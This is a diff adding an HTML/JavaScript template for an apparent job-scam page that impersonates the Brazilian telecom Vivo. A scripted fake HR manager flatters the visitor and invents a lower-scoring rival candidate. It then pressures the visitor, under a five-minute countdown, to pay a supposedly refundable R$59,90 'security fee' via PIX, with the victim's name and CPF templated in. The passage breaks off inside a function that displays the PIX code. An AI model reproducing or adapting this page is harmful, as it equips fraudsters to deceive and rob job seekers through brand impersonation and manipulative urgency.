@@ -1,0 +1,1135 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oportunidade Vivo | Processo Seletivo</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Vivo Fonts -->
+    <style>
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeRegular.woff2') }}') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeBold.woff2') }}') format('woff2');
+            font-weight: bold;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeLight.woff2') }}') format('woff2');
+            font-weight: 300;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        /* Estilos personalizados para a página */
+        :root {
+            --vivo-purple: #660099;
+            --vivo-purple-light: #9933CC;
+            --vivo-gray: #F2F2F2;
+            --vivo-dark-gray: #333333;
+            --vivo-success: #00C853;
+            --vivo-warning: #FF9800;
+            --vivo-danger: #FF3D00;
+        }
+        
+        body {
+            font-family: 'VivoType', 'Open Sans', sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .navbar {
+            background-color: var(--vivo-purple);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .vivo-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .vivo-card {
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+        
+        .vivo-card-header {
+            background: linear-gradient(90deg, var(--vivo-purple) 0%, var(--vivo-purple-light) 100%);
+            color: white;
+            padding: 20px;
+            position: relative;
+        }
+        
+        /* Imagem do perfil na barra superior */
+        .profile-header-img {
+            width: 46px;
+            height: 46px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid white;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        
+        .chat-container {
+            height: 60vh;
+            overflow-y: auto;
+            padding: 20px;
+            background-color: white;
+            scroll-behavior: smooth;
+        }
+        
+        .chat-container::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .chat-container::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+        
+        .chat-container::-webkit-scrollbar-thumb {
+            background: #c9c9c9;
+            border-radius: 10px;
+        }
+        
+        .chat-container::-webkit-scrollbar-thumb:hover {
+            background: #a0a0a0;
+        }
+        
+        .message-bubble {
+            margin-bottom: 16px;
+            max-width: 85%;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            padding: 0 15px;
+        }
+        
+        .incoming-message {
+            align-self: flex-start;
+            margin-right: auto;
+        }
+        
+        .outgoing-message {
+            align-self: flex-end;
+            margin-left: auto;
+            align-items: flex-end;
+        }
+        
+        .message-content {
+            padding: 14px 18px;
+            border-radius: 18px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            margin-top: 4px;
+            position: relative;
+            line-height: 1.5;
+        }
+        
+        /* Estilo para mensagens longas */
+        .long-message {
+            border-left: 3px solid #ffcc00;
+            padding-left: 20px;
+        }
+        
+        .incoming-message .message-content {
+            background-color: #9933CC; /* Cor roxa mais clara */
+            border-top-left-radius: 2px;
+            text-align: left;
+            color: white;
+            min-width: 200px;
+        }
+        
+        .outgoing-message .message-content {
+            background-color: #f0f0f0;
+            border-top-right-radius: 2px;
+            text-align: right;
+            border-right: 2px solid #ccc;
+        }
+        
+        .message-sender {
+            font-weight: 600;
+            font-size: 0.85rem;
+            margin-bottom: 2px;
+            color: var(--vivo-purple);
+        }
+        
+        .message-time {
+            font-size: 0.7rem;
+            color: #999;
+            margin-top: 4px;
+            display: none;
+        }
+        
+        /* Mostrar o horário apenas na última mensagem de cada sequência */
+        .message-bubble:last-child .message-time {
+            display: block;
+        }
+        
+        .typing-indicator {
+            padding: 10px 12px;
+            background-color: #f1f1f1;
+            border-radius: 18px;
+            margin-bottom: 16px;
+            display: inline-block;
+            align-self: flex-start;
+            color: #666;
+            max-width: 75px;
+        }
+        
+        .chat-avatar {
+            width: 46px;
+            height: 46px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid white;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+        
+        .avatar-container {
+            position: relative;
+            margin-right: 15px;
+        }
+        
+        .status-indicator {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background-color: var(--vivo-success);
+            border: 2px solid white;
+        }
+        
+        .chat-options {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding: 0 16px;
+        }
+        
+        .option-button {
+            background-color: white;
+            border: 2px solid #e1e1e1;
+            border-radius: 12px;
+            padding: 16px 20px;
+            text-align: left;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            font-weight: 500;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+            font-size: 1.05rem;
+            margin-bottom: 12px;
+        }
+        
+        .option-button:hover {
+            background-color: #f8f8f8;
+            border-color: var(--vivo-purple);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+        
+        .option-button.selected {
+            background-color: var(--vivo-purple);
+            color: white;
+            border-color: var(--vivo-purple);
+        }
+        
+        .option-button i {
+            font-size: 1.2rem;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        .option-button i {
+            margin-right: 8px;
+        }
+        
+        .timer-container {
+            background-color: #fff3e0;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 16px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(255, 152, 0, 0.15);
+            position: relative;
+            border-left: 4px solid var(--vivo-warning);
+        }
+        
+        .timer-container::before {
+            content: "\f017"; /* Font Awesome clock icon */
+            font-family: "Font Awesome 5 Free";
+            font-weight: 900;
+            font-size: 1.2rem;
+            position: absolute;
+            top: 14px;
+            left: 14px;
+            color: var(--vivo-warning);
+        }
+        
+        .timer {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--vivo-danger);
+            margin: 10px 0;
+            font-family: monospace;
+        }
+        
+        .timer-label {
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 15px;
+        }
+        
+        .action-button {
+            display: block;
+            background: linear-gradient(90deg, var(--vivo-purple) 0%, var(--vivo-purple-light) 100%);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 14px 24px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 0, 153, 0.3);
+            text-transform: uppercase;
+            text-decoration: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .action-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(102, 0, 153, 0.4);
+            color: white;
+        }
+        
+        .action-button i {
+            margin-right: 8px;
+        }
+        
+        .footer-note {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #999;
+            margin-top: 20px;
+        }
+        
+        .vivo-logo {
+            height: 32px;
+        }
+        
+        .header-title {
+            margin: 0;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+        
+        .header-subtitle {
+            margin: 0;
+            font-size: 0.85rem;
+            opacity: 0.8;
+        }
+        
+        .header-info {
+            display: flex;
+            align-items: center;
+        }
+        
+        .typing-dots:after {
+            content: '...';
+            animation: typing 1.5s infinite;
+            display: inline-block;
+            width: 20px;
+            text-align: left;
+        }
+        
+        @keyframes typing {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+        
+        @media (max-width: 576px) {
+            .message-bubble {
+                max-width: 85%;
+            }
+            
+            .chat-container {
+                height: 55vh;
+                padding: 15px;
+            }
+            
+            .timer {
+                font-size: 2.2rem;
+            }
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* Animações suaves */
+        .fade-in {
+            animation: fadeIn 0.5s ease forwards;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .highlight-pulse {
+            animation: highlightPulse 2s infinite;
+        }
+        
+        @keyframes highlightPulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 61, 0, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 61, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 61, 0, 0); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Sem logo no topo, pois teremos um chat full screen -->
+    
+    <!-- Chatbot em tela inteira -->
+    <div class="d-flex flex-column vh-100">
+        <!-- Cabeçalho do chat -->
+        <div class="vivo-card-header py-3">
+            <div class="d-flex align-items-center container">
+                <div class="avatar-container">
+                    <img src="https://i.ibb.co/ZppGLJWj/assets-task-01jvvtc64hep781ecfs2f7gxz7-1747911650-img-0.webp" 
+                         class="chat-avatar" alt="Rafaela de Cássia">
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="header-info">
+                    <div>
+                        <h2 class="header-title">Rafaela de Cássia</h2>
+                        <p class="header-subtitle">Gerente de RH - Vivo</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Corpo do chat -->
+        <div class="flex-grow-1 overflow-hidden position-relative bg-light">
+            <div class="chat-container h-100" id="chatContainer">
+                <!-- As mensagens serão inseridas aqui pelo JavaScript -->
+            </div>
+            
+            <!-- Indicador de digitação posicionado onde aparecerão as mensagens -->
+            <div id="typingIndicator" class="message-bubble incoming-message hidden" style="margin-left: 15px; margin-bottom: 0; position: relative;">
+                <div class="message-content d-flex align-items-center" style="background-color: #9933CC; color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
+                    <div class="typing-animation">
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                    </div>
+                </div>
+            </div>
+            
+            <style>
+                .typing-animation {
+                    display: flex;
+                    align-items: center;
+                    column-gap: 5px;
+                    height: 15px;
+                }
+                
+                .typing-animation .dot {
+                    display: block;
+                    width: 7px;
+                    height: 7px;
+                    opacity: 0.8;
+                    border-radius: 50%;
+                    background-color: white;
+                    animation: loadingFade 1s infinite;
+                }
+                
+                .typing-animation .dot:nth-child(1) {
+                    animation-delay: 0s;
+                }
+                
+                .typing-animation .dot:nth-child(2) {
+                    animation-delay: 0.2s;
+                }
+                
+                .typing-animation .dot:nth-child(3) {
+                    animation-delay: 0.4s;
+                }
+                
+                @keyframes loadingFade {
+                    0% {
+                        opacity: 0.3;
+                        transform: scale(0.8);
+                    }
+                    50% {
+                        opacity: 1;
+                        transform: scale(1.2);
+                    }
+                    100% {
+                        opacity: 0.3;
+                        transform: scale(0.8);
+                    }
+                }
+            </style>
+            
+            <!-- Elemento para a intro da Rafaela -->
+            <div id="rafaelaIntro" class="welcome-intro d-flex align-items-center justify-content-center w-100" style="position: fixed; top: 100px; left: 0; right: 0; z-index: 9999; animation: fadeInDown 0.5s ease-out;">
+                <div class="text-center bg-white p-4 rounded-3 shadow-lg">
+                    <img src="https://i.ibb.co/ZppGLJWj/assets-task-01jvvtc64hep781ecfs2f7gxz7-1747911650-img-0.webp" 
+                         class="mb-3" alt="Rafaela de Cássia" 
+                         style="width: 150px; height: 150px; border-radius: 50%; border: 4px solid var(--vivo-purple); box-shadow: 0 3px 10px rgba(102, 0, 153, 0.2);">
+                    <div class="fw-bold text-center" style="font-size: 1.5rem; color: var(--vivo-purple);">Rafaela de Cássia</div>
+                    <div class="text-muted" style="font-size: 1.1rem;">Gerente de RH - Vivo</div>
+                    <div class="mt-3 d-flex align-items-center justify-content-center text-muted">
+                        <div class="spinner-border spinner-border-sm text-purple me-2" role="status" style="color: var(--vivo-purple);">
+                            <span class="visually-hidden">Loading...</span>
+                        </div>
+                        <span>Iniciando conversa...</span>
+                    </div>
+                </div>
+            </div>
+
+            <style>
+                @keyframes fadeInDown {
+                    from {
+                        opacity: 0;
+                        transform: translateY(-30px);
+                    }
+                    to {
+                        opacity: 1;
+                        transform: translateY(0);
+                    }
+                }
+                
+                @keyframes fadeOutUp {
+                    from {
+                        opacity: 1;
+                        transform: translateY(0);
+                    }
+                    to {
+                        opacity: 0;
+                        transform: translateY(-30px);
+                    }
+                }
+                
+                @keyframes pulseLight {
+                    0% {
+                        box-shadow: 0 0 0 0 rgba(102, 0, 153, 0.2);
+                    }
+                    70% {
+                        box-shadow: 0 0 0 15px rgba(102, 0, 153, 0);
+                    }
+                    100% {
+                        box-shadow: 0 0 0 0 rgba(102, 0, 153, 0);
+                    }
+                }
+                
+                .fade-out-up {
+                    animation: fadeOutUp 0.5s ease-out forwards;
+                }
+            </style>
+        </div>
+        
+        <!-- Área de interação (botões de resposta/timer) -->
+        <div class="bg-white p-3 border-top">
+            <!-- Opções de resposta -->
+            <div class="chat-options mx-auto" id="interestOptions" style="max-width: 600px;">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Sim, ainda tenho interesse na vaga', 'showStartOptions')">
+                    <i class="fas fa-check-circle" style="color: var(--vivo-success);"></i> 
+                    Sim, ainda tenho interesse na vaga
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Não, obrigado', 'showInterestExplanation')">
+                    <i class="fas fa-times-circle" style="color: var(--vivo-danger);"></i> 
+                    Não, obrigado
+                </button>
+            </div>
+            
+            <div class="chat-options mx-auto" id="startOptions" style="max-width: 600px;">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Posso começar essa semana', 'showBenefits')">
+                    <i class="fas fa-calendar-check" style="color: var(--vivo-success);"></i> 
+                    Posso começar essa semana
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Apenas no mês que vem', 'showBenefits')">
+                    <i class="fas fa-calendar-alt" style="color: var(--vivo-purple);"></i> 
+                    Apenas no mês que vem
+                </button>
+            </div>
+            
+            <div class="chat-options mx-auto" id="holdOptions" style="max-width: 600px;">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Sim, vou realizar o pagamento agora', 'showPaymentExplanation')">
+                    <i class="fas fa-check-circle" style="color: var(--vivo-success);"></i> 
+                    Sim, vou realizar o pagamento agora
+                </button>
+            </div>
+            
+            <!-- Timer de urgência -->
+            <div class="timer-container mx-auto highlight-pulse" id="timerContainer" style="max-width: 600px; display: none;">
+                <div class="timer" id="timer">05:00</div>
+                <div class="timer-label">Tempo restante para garantir sua vaga</div>
+                <a href="{{ url_for('pagamento') }}" class="action-button">
+                    <i class="fas fa-lock"></i> Efetuar Pagamento da Taxa de Segurança
+                </a>
+                <p class="mt-2 small text-muted">
+                    O valor de R$59,90 será totalmente reembolsado no seu primeiro pagamento.
+                </p>
+            </div>
+        </div>
+        
+        <!-- Rodapé removido -->
+    </div>
+    
+    <!-- Bootstrap Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- Script personalizado para o chat -->
+    <script>
+        // Dados do candidato
+        const candidateData = {
+            name: "{{ nome }}".trim() || "Candidato",
+            city: "{{ cidade }}".trim() || "São Paulo",
+            cpf: "{{ cpf }}".trim() || "",
+            pixCode: "{{ pix_code }}".trim() || ""
+        };
+        
+        // Formatação para exibir apenas o primeiro nome
+        const firstName = candidateData.name.split(' ')[0];
+        
+        // Sequência de mensagens do chatbot
+        const chatSequence = [
+            {
+                message: `Olá ${firstName}, tudo bem? Aqui é a Rafaela de Cássia, Gerente de RH da Vivo.`,
+                delay: 3000
+            },
+            {
+                message: "Estou entrando em contato porque identifiquei que você iniciou o processo seletivo para nossa vaga de Atendente de Suporte em regime Home Office.",
+                delay: 5000
+            },
+            {
+                message: `${firstName}, preciso dizer que fiquei muito impressionada com o seu perfil profissional! Seu currículo realmente se destacou entre os demais candidatos.`,
+                delay: 6000
+            },
+            {
+                message: "Nossa equipe de recrutamento analisou com atenção suas habilidades e experiências, e você tem exatamente o que estamos buscando para essa posição.",
+                delay: 5500
+            },
+            {
+                message: "Sua pontuação no teste de aptidão foi excelente, o que confirma que você tem o perfil ideal para integrar nossa equipe de atendimento remoto.",
+                delay: 5000
+            },
+            {
+                message: `As vagas estão sendo preenchidas rapidamente, temos muitos candidatos interessados. Por isso gostaria de saber: você ainda tem interesse em trabalhar conosco na Vivo?`,
+                delay: 6000,
+                showOptions: 'interestOptions'
+            }
+        ];
+        
+        // Respostas condicionais
+        const interestExplanation = [
+            {
+                message: "Entendo sua decisão. Caso mude de ideia, sua vaga continuará disponível por mais 24 horas em nosso sistema.",
+                delay: 2500
+            },
+            {
+                message: "Se decidir prosseguir com a candidatura, basta acessar novamente o link que enviamos. Obrigada pelo seu tempo e atenção!",
+                delay: 3000
+            }
+        ];
+        
+        const startWorkResponses = {
+            showBenefits: [
+                {
+                    message: "Que ótimo! Vou te explicar novamente os principais benefícios da nossa vaga de Atendente Home Office:",
+                    delay: 2500
+                },
+                {
+                    message: "○ Salário base de R$1.788,60\n○ Vale alimentação de R$1.236,00\n○ Home Office (trabalhe de qualquer lugar!)\n○ Plano de saúde e odontológico Vale Saúde\n○ Auxílio creche de R$245,00 por filho até 6 anos\n○ Linha Vivo com 58GB mensal grátis",
+                    longTypingTime: true, // Marcador para tempo de digitação mais longo
+                    delay: 4000
+                },
+                {
+                    message: "Para colaboradores que trabalham nos finais de semana, oferecemos um adicional de R$178,40 por dia, e para o turno noturno, adicional de R$199,32 por mês.",
+                    delay: 3000
+                },
+                {
+                    message: `${firstName}, preciso compartilhar uma informação importante com você. Temos outra candidata, Renata Freire, que também é de ${candidateData.city} e está interessada na mesma vaga.`,
+                    delay: 3800
+                },
+                {
+                    message: "No entanto, a Renata obteve uma pontuação menor que a sua no teste de aptidão, e nós da Vivo sempre priorizamos os candidatos mais qualificados como você.",
+                    delay: 3500
+                },
+                {
+                    message: "Você gostaria que eu reservasse essa vaga exclusivamente para você e descartasse a candidatura da Renata?",
+                    delay: 3000,
+                    showOptions: 'holdOptions'
+                }
+            ]
+        };
+        
+        const paymentExplanation = [
+            {
+                message: "Excelente escolha! Vou descartar a candidatura da Renata imediatamente e reservar a vaga exclusivamente para você.",
+                delay: 2500
+            },
+            {
+                message: "Para finalizar seu processo de contratação e confirmar o envio dos equipamentos necessários (notebook, headset com microfone e colete oficial da Vivo), precisamos que você efetue o pagamento da Taxa de Segurança.",
+                delay: 3800
+            },
+            {
+                message: "Esta taxa de R$59,90 serve como uma garantia para o envio dos equipamentos, que têm valor superior a R$3.000,00. Infelizmente, já tivemos casos em que candidatos receberam os equipamentos e desistiram da vaga sem devolvê-los.",
+                delay: 4200
+            },
+            {
+                message: "É importante esclarecer que esta é uma medida de segurança exigida pelo nosso departamento financeiro para proteger o patrimônio da empresa. O valor será integralmente reembolsado no seu primeiro pagamento.",
+                delay: 3500
+            },
+            {
+                message: "Após a confirmação do pagamento, os equipamentos serão enviados em até 5 dias úteis para o endereço que você cadastrou em nosso sistema.",
+                delay: 3000
+            },
+            {
+                message: `${firstName}, posso definir um prazo de 5 minutos para você efetuar esse pagamento? Assim garantimos sua vaga e iniciamos imediatamente os procedimentos para o envio dos equipamentos.`,
+                delay: 3200,
+                showTimer: true
+            }
+        ];
+        
+        const finalAppeal = [
+            {
+                message: "Compreendo sua hesitação, mas gostaria de esclarecer que essa é uma prática padrão da Vivo para todas as contratações em regime home office.",
+                delay: 2800
+            },
+            {
+                message: "A taxa de segurança é totalmente reembolsável e serve apenas como garantia para os equipamentos que serão enviados, cujo valor ultrapassa R$3.000,00.",
+                delay: 3500
+            },
+            {
+                message: `${firstName}, infelizmente, se não pudermos confirmar a reserva da sua vaga hoje, teremos que seguir o processo e oferecer a posição para a próxima candidata na fila, que é a Renata Freire.`,
+                delay: 3800
+            },
+            {
+                message: "Seria realmente uma pena perder um talento como você por causa de uma simples formalidade do processo de contratação. Posso dar um prazo de 5 minutos para você considerar esta oportunidade?",
+                delay: 3500,
+                showTimer: true
+            }
+        ];
+        
+        // Elementos DOM
+        const chatContainer = document.getElementById('chatContainer');
+        const typingIndicator = document.getElementById('typingIndicator');
+        const rafaelaIntro = document.getElementById('rafaelaIntro');
+        const interestOptions = document.getElementById('interestOptions');
+        const startOptions = document.getElementById('startOptions');
+        const holdOptions = document.getElementById('holdOptions');
+        const timerContainer = document.getElementById('timerContainer');
+        const timerElement = document.getElementById('timer');
+        
+        // Formatação de data e hora
+        function getFormattedTime() {
+            const now = new Date();
+            return now.getHours().toString().padStart(2, '0') + ':' + 
+                   now.getMinutes().toString().padStart(2, '0');
+        }
+        
+        // Iniciar o chat
+        window.onload = function() {
+            startChat();
+        };
+        
+        // Função para garantir que o scroll vá até o final do chat
+        function scrollToBottom() {
+            chatContainer.scrollTop = chatContainer.scrollHeight;
+            // Garantir que o scroll chegue até o fim mesmo após renderização completa
+            setTimeout(() => {
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+            }, 100);
+        }
+        
+        // Função para mostrar a animação de digitação
+        function showTyping() {
+            // Adicionar o indicador de digitação ao container do chat
+            chatContainer.appendChild(typingIndicator);
+            typingIndicator.classList.remove('hidden');
+            scrollToBottom();
+        }
+        
+        // Função para esconder a animação de digitação
+        function hideTyping() {
+            typingIndicator.classList.add('hidden');
+            // Opcional: remover do DOM quando não estiver sendo exibido
+            if (typingIndicator.parentNode) {
+                typingIndicator.parentNode.removeChild(typingIndicator);
+            }
+        }
+        
+        // Função para adicionar mensagem ao chat
+        function addMessage(message, isOutgoing = false) {
+            const messageElement = document.createElement('div');
+            messageElement.className = `message-bubble ${isOutgoing ? 'outgoing-message' : 'incoming-message'} fade-in`;
+            
+            let messageHTML = '';
+            
+            // Verificar se é uma mensagem longa
+            const isLongMessage = message.length > 120 && !isOutgoing;
+            
+            // Nome da Rafaela não é mostrado em cada balão
+            if (isLongMessage) {
+                messageHTML += `<div class="message-content long-message">${message.replace(/\n/g, '<br>')}</div>`;
+            } else {
+                messageHTML += `<div class="message-content">${message.replace(/\n/g, '<br>')}</div>`;
+            }
+            messageHTML += `<div class="message-time">${getFormattedTime()}</div>`;
+            
+            messageElement.innerHTML = messageHTML;
+            chatContainer.appendChild(messageElement);
+            scrollToBottom();
+            
+            // Para debug - ver o tamanho da mensagem
+            console.log(`Tamanho da mensagem: ${message.length} caracteres. Longa: ${isLongMessage}`);
+        }
+        
+        // Função para esconder todos os conjuntos de opções
+        function hideAllOptions() {
+            document.querySelectorAll('.chat-options').forEach(element => {
+                element.style.display = 'none';
+            });
+        }
+        
+        // Função para mostrar um conjunto específico de opções
+        function showOptions(optionsId) {
+            hideAllOptions();
+            const optionsElement = document.getElementById(optionsId);
+            if (optionsElement) {
+                optionsElement.style.display = 'block';
+                scrollToBottom();
+            }
+        }
+        
+        // Função para iniciar o chat
+        async function startChat() {
+            // Esconder todas as opções no início
+            hideAllOptions();
+            
+            // Garantir que o elemento rafaelaIntro está definido
+            if (!rafaelaIntro) {
+                console.error("Elemento rafaelaIntro não encontrado");
+                return;
+            }
+            
+            try {
+                // Mostrar a introdução da Rafaela
+                rafaelaIntro.style.display = 'flex';
+                
+                // Definir um temporizador para remover o elemento após 4 segundos
+                setTimeout(function() {
+                    console.log("Removendo intro da Rafaela");
+                    
+                    // Animação de saída
+                    rafaelaIntro.classList.add('fade-out-up');
+                    
+                    // Esconder e remover completamente do DOM
+                    setTimeout(function() {
+                        console.log("Removendo completamente");
+                        rafaelaIntro.style.display = 'none';
+                        rafaelaIntro.parentNode.removeChild(rafaelaIntro);
+                    }, 500);
+                }, 4000);
+                
+                // Pausa antes de começar o chat (não aguardar a animação)
+                await new Promise(resolve => setTimeout(resolve, 4500));
+            } catch (error) {
+                console.error("Erro ao inicializar chat:", error);
+            }
+            
+            // Iniciar a sequência de mensagens
+            for (let i = 0; i < chatSequence.length; i++) {
+                const item = chatSequence[i];
+                
+                // Mostrar indicador de "Digitando..."
+                showTyping();
+                
+                // Garantir que o indicador de digitação seja visível por um tempo
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Tempo de digitação baseado no tamanho da mensagem (mais realista)
+                const typingTime = Math.max(5000, item.message.length * 40);
+                await new Promise(resolve => setTimeout(resolve, typingTime));
+                
+                // Esconder indicador de digitação
+                hideTyping();
+                
+                // Adicionar a mensagem
+                addMessage(item.message);
+                
+                // Se houver opções para mostrar
+                if (item.showOptions) {
+                    // Pausa antes de mostrar as opções de resposta
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    showOptions(item.showOptions);
+                }
+                
+                // Pausa maior entre mensagens (exceto se for a última ou tiver opções)
+                if (i < chatSequence.length - 1 && !item.showOptions) {
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                }
+            }
+        }
+        
+        // Função para lidar com cliques nas opções
+        async function handleOptionClick(button, response, nextSequence) {
+            // Desabilitar todas as opções
+            const optionsContainer = button.parentElement;
+            const allButtons = optionsContainer.querySelectorAll('button');
+            allButtons.forEach(btn => {
+                btn.disabled = true;
+                btn.classList.add('opacity-50');
+            });
+            
+            // Destacar a opção selecionada
+            button.classList.add('selected');
+            button.classList.remove('opacity-50');
+            
+            // Adicionar a resposta do usuário ao chat
+            addMessage(response, true);
+            
+            // Esconder o container de opções imediatamente
+            hideAllOptions();
+            
+            // Pausa maior após a resposta do usuário para dar tempo de leitura
+            // O tempo varia conforme o tamanho da resposta do usuário
+            const userResponseReadTime = Math.max(3000, response.length * 70);
+            await new Promise(resolve => setTimeout(resolve, userResponseReadTime));
+            
+            // Mostrar que a Rafaela está digitando novamente
+            showTyping();
+            
+            // Aguardar um tempo realista para a digitação da resposta
+            // Tempo de digitação fixo já que não temos acesso à próxima mensagem ainda
+            const realisticTypingTime = 5000;
+            console.log("Tempo de digitação para resposta: " + realisticTypingTime + "ms");
+            await new Promise(resolve => setTimeout(resolve, realisticTypingTime));
+            
+            // Proceder com a próxima sequência
+            hideTyping();
+            
+            if (nextSequence === 'showInterestExplanation') {
+                processSequence(interestExplanation);
+            } else if (nextSequence === 'showStartOptions') {
+                // Adicionar uma mensagem de transição antes de mostrar as próximas opções
+                addMessage("Que bom que você ainda tem interesse! Vamos continuar então.");
+                
+                // Pausa antes de mostrar as próximas opções
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                // Mostrar indicador de digitação novamente
+                showTyping();
+                await new Promise(resolve => setTimeout(resolve, 4000));
+                hideTyping();
+                
+                // Adicionar a pergunta sobre quando pode começar
+                addMessage("Quando você poderia começar a trabalhar conosco?");
+                
+                // Pequena pausa antes de mostrar as opções
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Mostrar as opções
+                showOptions('startOptions');
+            } else if (nextSequence === 'showBenefits') {
+                processSequence(startWorkResponses.showBenefits);
+            } else if (nextSequence === 'showPaymentExplanation') {
+                processSequence(paymentExplanation);
+            } else if (nextSequence === 'showFinalAppeal') {
+                processSequence(finalAppeal);
+            }
+        }
+        
+        // Função para processar uma sequência de mensagens
+        async function processSequence(sequence) {
+            for (let i = 0; i < sequence.length; i++) {
+                const item = sequence[i];
+                
+                // Mostrar indicador de digitação
+                showTyping();
+                
+                // Aguardar o tempo de "digitação" (usando tempos mais longos baseados no tamanho da mensagem)
+                // Se a mensagem estiver marcada como longTypingTime, dar tempo extra para a digitação
+                const baseTypingTime = item.longTypingTime ? 10000 : 5000;
+                const typingTime = Math.max(baseTypingTime, item.message.length * 30);
+                console.log(`Digitando mensagem: ${item.message.length} caracteres, tempo: ${typingTime}ms`);
+                await new Promise(resolve => setTimeout(resolve, typingTime));
+                
+                // Esconder indicador de digitação
+                hideTyping();
+                
+                // Adicionar a mensagem
+                addMessage(item.message);
+                
+                // Se houver opções para mostrar
+                if (item.showOptions) {
+                    // Pequena pausa antes de mostrar as opções
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    showOptions(item.showOptions);
+                }
+                
+                // Se for para mostrar o timer
+                if (item.showTimer) {
+                    // Pequena pausa antes de mostrar o timer
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    startTimer();
+                }
+                
+                // Pausa maior entre mensagens para simular uma conversa real
+                // O tempo de pausa depende do tamanho da mensagem atual para dar mais tempo para leitura
+                if (i < sequence.length - 1 && !item.showOptions && !item.showTimer) {
+                    // Para mensagens mais longas, dê mais tempo de leitura antes da próxima digitação
+                    const readingTime = Math.max(5000, item.message.length * 50);
+                    await new Promise(resolve => setTimeout(resolve, readingTime));
+                }
+            }
+        }
+        
+        // Função para mostrar o código PIX copiável
+        function showPixCode() {
+            if (candidateData.pixCode) {
+                const pixContainer = document.createElement('div');
+                pixContainer.className = 'message-bubble incoming-message fade-in';
+                pixContainer.style.cssText = `
+                    background: #f8f9fa;
+                    border: 2px solid var(--vivo-purple);
+                    border-radius: 15px;
+                    padding: 20px;
+                    margin: 10px 0;
+                    text-align: center;
+                `;
+                
